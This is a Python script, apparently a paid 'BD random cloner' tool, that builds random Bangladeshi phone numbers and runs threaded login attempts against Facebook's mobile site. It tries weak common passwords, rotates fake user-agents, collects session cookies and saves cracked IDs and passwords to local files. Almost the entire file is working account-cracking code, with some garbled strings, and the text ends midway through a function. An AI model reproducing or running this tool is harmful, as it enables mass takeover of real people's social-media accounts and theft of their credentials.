import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadP
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\ [âœ“] installing requests !...\')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\ [âœ“] installing futures !...\')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\ [âœ“] installing bs4 !...\')
    os.system('pip install bs4')
R = '\33[1;31m' # PUTIH
G = '\33[1;32m' # PUTIH
H = '\33[1;32m' # PUTIH
Y = '\33[1;33m' # PUTIH
Q = '\33[1;37m'
T = '\33[1;34m'
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
R = '\1b[1;91m' 
G = '\1b[1;92m' 
Y = '\1b[1;93m' 
### WARNA RANDOM ###
P = '\1b[1;97m' # PUTIH
M = '\1b[1;91m' # MERAH
H = '\1b[1;92m' # HIJAU
K = '\1b[1;93m' # KUNING
B = '\1b[1;94m' # BIRU
U = '\1b[1;95m' # UNGU
MXD = '\33[1;92m' #MAHADIGREEN
O = '\1b[1;96m' # BIRU MUDA
N = '\1b[0m'    # WARNA MATI
A = '\1b[1;90m' # WARNA ABU ABU
BN = '\1b[1;107m' # BELAKANG PUTIH
BBL = '\1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\1b[1;105m' # BELAKANG PINK
BB = '\1b[1;104m' # BELAKANG BIRU
BK = '\1b[1;103m' # BELAKANG KUNING
BH = '\1b[1;102m' # BELAKANG HIJAU
BM = '\1b[1;101m' # BELAJANG MERAH
BA = '\1b[1;100m' # BELAKANG ABU ABU
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By yousuf")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\1b[1;97m' # 
M = '\33[1;31m' # 
H = '\33[1;32m' # 
K = '\1b[1;97m' # 
B = '\1b[1;97m' # 
U = '\1b[1;95m' # 
O = '\1b[1;97m' # 
N = '\1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)
	
	

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]            
            
os.system("clear")
print(" \33[92;1m FOLLOW US ON GITHUB ")
os.system("xdg-open https://github.com/TVAHMED")
logo=("""\33[92;1m
   ______ _____  _____   ____  _____  
 |  ____|  __ \|  __ \ / __ \|  __ \ 
 | |__  | |__) | |__) | |  | | |__) |
 |  __| |  _  /|  _  /| |  | |  _  / 
 | |____| | \ \| | \ \| |__| | | \ \ 
 |______|_|  \_\_|  \_\\____/|_|  \_\                                                      
                \33[1;30m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝐰𝐨𝐫𝐥𝐝 ♚
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;1mA H M E D  ♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \33[38;5;196m: \33[1;92mPrince king hu yawr( 𝐌 )  \33[38;5;46m           ▇▎  
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \33[38;5;196m: \33[1;92m+𝟖𝟖𝟎𝟏𝟑𝟏𝟕𝟒𝟖𝟏𝟗𝟖𝟒 \33[38;5;46m                  ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \33[38;5;196m: \33[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/TVAHMED\33[38;5;46m ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐒𝐭𝐚𝐭𝐮𝐬    \33[38;5;196m: \33[1;92m𝐏𝐚𝐢𝐝 \3[97;1m⬤  \33[38;5;46m                         ▇▎           
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐍𝐞𝐭𝐰𝐨𝐫𝐤   \33[38;5;196m: \33[1;92m𝟑𝐆\33[97;1m,\33[1;92m𝟒𝐆\33[97;1m/\33[1;92m𝟓𝐆\33[97;1m, \33[1;92m𝐎𝐍 \33[38;5;46m                    ▇▎      
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐕𝐞𝐫𝐬𝐢𝐨𝐧   \33[38;5;196m: \33[1;92m 𝟑.𝟎.𝟏 \33[1;92m𝐔𝐥𝐭𝐫𝐚 \33[38;5;46m                    ▇▎           
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐓𝐨𝐨𝐥𝐬     \33[38;5;196m: \3[97;1m𝐑𝐀𝐍𝐃𝐎𝐌 + 𝐅𝐈𝐋𝐄 \33[38;5;46m                   ▇▎
\33[38;5;46m ▊                                                 ▇▇
\33[92;1m ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀""")

def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\ 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
	os.system('clear')
	print(logo)
	print('\33[97;1m  ❥ 1 ‣  𝐁𝐃 𝐑𝐚𝐧𝐝𝐨𝐦 𝐂𝐥𝐨𝐧𝐞𝐫 ')
	print("\33[97;1m  ❥ 2 ‣  𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐂𝐥𝐨𝐧𝐞𝐫 ")
	print("\33[97;1m  ❥ 3 ‣  𝐁𝐃 𝐔𝐈𝐃 𝐂𝐥𝐨𝐧𝐞𝐫 \33[1;32m 𝐏𝐑𝐎 ")
	print("\33[97;1m  ❥ 4 ‣  𝐂𝐨𝐧𝐭𝐫𝐚𝐜𝐭 𝐀𝐝𝐦𝐢𝐧 ")
	print('\33[97;1m  ❥ 5 ‣  𝐁𝐚𝐜𝐤')
	print(51*'\33[92;1m▬')
	
	opt = input('𝐂𝐡𝐨𝐨𝐬𝐞 𝐨𝐩𝐭𝐢𝐨𝐧 \33[97;1m➠ ')
	if opt =='1':
		x()
	if opt =='2':
		virus2()
	if opt =='3':
		virus3()
	if opt =='4':
		admin()
	elif opt =='0':
		exit()
	else:
		print('\\33[1;92m𝐂𝐡𝐨𝐨𝐬𝐞 𝐯𝐚𝐥𝐢𝐝 𝐨𝐩𝐭𝐢𝐨𝐧\33[0;97m');time.sleep(1)
		Main()
def admin():
	os.system('clear')
	print(logo)
	print(50*'_')
	print(' [1] 𝐂𝐨𝐧𝐭𝐫𝐚𝐜𝐭 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 ')
	print(' [2] 𝐅𝐨𝐥𝐥𝐨𝐰 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 ')
	print(' [3] 𝐅𝐨𝐥𝐥𝐨𝐰 𝐆𝐢𝐭𝐡𝐮𝐛 ')
	print(' [0] 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐦𝐞𝐧𝐮')
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 𝐨𝐩𝐭𝐢𝐨𝐧>>> ')
	if bal =='1':
		os.system('xdg-open https://wa.me/+03277025198');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/price King hu yawr');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/TVAHMED');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "𝐘𝐎𝐔𝐒𝐔𝐅-𝐌-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\33[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  
  print("\1b[1;92m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒\33[38;5;46m : "+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/TVAHMED/RANDOM/main/Apruval.txt").text 
    if id in httpCaht: 
      print("\1b[1;96m  ➠   𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐔𝐒: 𝐀𝐂𝐓𝐈𝐕𝐄  \33[97;1m  ✔ ") 
      msg = str(os.geteuid()) 
      time.sleep(0.3) 
      pass 
    else: 
      print("\1b[38;5;248m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒 𝐍𝐎𝐓 𝐀𝐂𝐓𝐈𝐕𝐄\3[97;1m ✘") 
      print("\1b[38;5;208m  ➠  𝐂𝐎𝐏𝐘 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐄𝐍𝐓 𝐀𝐔𝐓𝐇𝐎𝐑") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     hoga_check()
hoga_check()
def x():
	user=[]
	os.system('clear')
	print(logo)
	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
	doamin = ' 𝐁𝐃 𝐑𝐚𝐧𝐝𝐨𝐦 𝐂𝐥𝐨𝐧𝐞𝐫 '
	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(11))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \33[97;1m[🚀]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬  :\33[1;92m '+tl)
		print('\33[97;1m [🚀]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
		print(f'\33[97;1m [🚀]\33[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\33[1;92m {kode} ')
		#print(f"\33[1;97m [🚀]  𝐂𝐡𝐨𝐢𝐜𝐞 :\33[1;92m {doamin}")
		print(' \33[1;97m[🚀]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
		print(' [🚀]  𝐔𝐬𝐞 𝐇𝐞𝐥𝐢𝐜𝐨𝐩𝐭𝐞𝐫 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 😑 ')
		print(50*'_')
		for guru in user:
			uid = kode+guru
			ps1 = uid[6:]
			ps2 = uid[5:]
			ps3 = uid[4:]
			pwx = [uid,ps1,ps2,ps3,'freefire','bangladesh','freefire1122','Free Fire','freefire123']
			yaari.submit(a,uid,pwx,tl)
	print(50*'_')
	print(' [💉] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
	print(' [💉] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
	print(50*'_')
	exit()
def virus():
	user=[]
	os.system('clear')
	print(logo)
	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 '
	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \33[97;1m[🚀]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬  :\33[1;92m '+tl)
		print('\33[97;1m [🚀]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
		print(f'\33[97;1m [🚀]\33[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\33[1;92m {kode} ')
		#print(f"\33[1;97m [🚀]  𝐂𝐡𝐨𝐢𝐜𝐞 :\33[1;92m {doamin}")
		print(' \33[1;97m[🚀]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
		print(' [🚀]  𝐔𝐬𝐞 𝐇𝐞𝐥𝐢𝐜𝐨𝐩𝐭𝐞𝐫 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 😑 ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','i love you','freefire1122','pubg123']
			yaari.submit(a,uid,pwx,tl)
	print(50*'_')
	print(' [💉] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
	print(' [💉] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
	print(50*'_')
	exit()
def virus2():
	user=[]
	os.system('clear')
	print(logo)
	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 '
	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \33[97;1m[🚀]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬  :\33[1;92m '+tl)
		print('\33[97;1m [🚀]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
		print(f'\33[97;1m [🚀]\33[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\33[1;92m {kode} ')
		#print(f"\33[1;97m [🚀]  𝐂𝐡𝐨𝐢𝐜𝐞 :\33[1;92m {doamin}")
		print(' \33[1;97m[🚀]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
		print(' [🚀]  𝐔𝐬𝐞 𝐇𝐞𝐥𝐢𝐜𝐨𝐩𝐭𝐞𝐫 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 😑 ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','i love you','maliha akhter']
			yaari.submit(b,uid,pwx,tl)
	print(50*'_')
	print(' [💉] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
	print(' [💉] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
	print(50*'_')
	exit()
def virus3():
	user=[]
	os.system('clear')
	print(logo)
	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
	doamin = ' 𝐁𝐃 𝐔𝐈𝐃 𝐂𝐥𝐨𝐧𝐞𝐫 \33[1;32m 𝐏𝐑𝐎 '
	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \33[97;1m[🚀]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬  :\33[1;92m '+tl)
		print('\33[97;1m [🚀]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
		print(f'\33[97;1m [🚀]\33[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\33[1;92m {kode} ')
		#print(f"\33[1;97m [🚀]  𝐂𝐡𝐨𝐢𝐜𝐞 :\33[1;92m {doamin}")
		print(' \33[1;97m[🚀]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
		print(' [🚀]  𝐔𝐬𝐞 𝐇𝐞𝐥𝐢𝐜𝐨𝐩𝐭𝐞𝐫 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 😑 ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','hot boy','i love you','hot boy']
			yaari.submit(c,uid,pwx,tl)
	print(50*'_')
	print(' [💉] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
	print(' [💉] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
	print(50*'_')
	exit()
def a(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\ \33[1;90m[\33[1;93m𝐘𝐎𝐔𝐒𝐔𝐅\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://m.free.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\\3[1;92m [𝐎𝐊] '+cid+' | '+ps+'\3[0;92m')
                #print(f'\\3[1;92m [🚀] Number : {uid}')
                #print(f'\\33[1;92m [♥] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/Yousuf-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\3[1;91m[CP] {uid}|{ps}")
                print(f'{W}CP-UA--> {pro}\ ')
                open('/sdcard/yousuf-CP.txt', 'a').write( uid+' | '+ps+' \')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[𝐘𝐎𝐔𝐒𝐔𝐅] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B}𝐘𝐎𝐔𝐒𝐔𝐅{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\ \33[1;90m[\33[1;93m𝐘𝐎𝐔𝐒𝐔𝐅\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
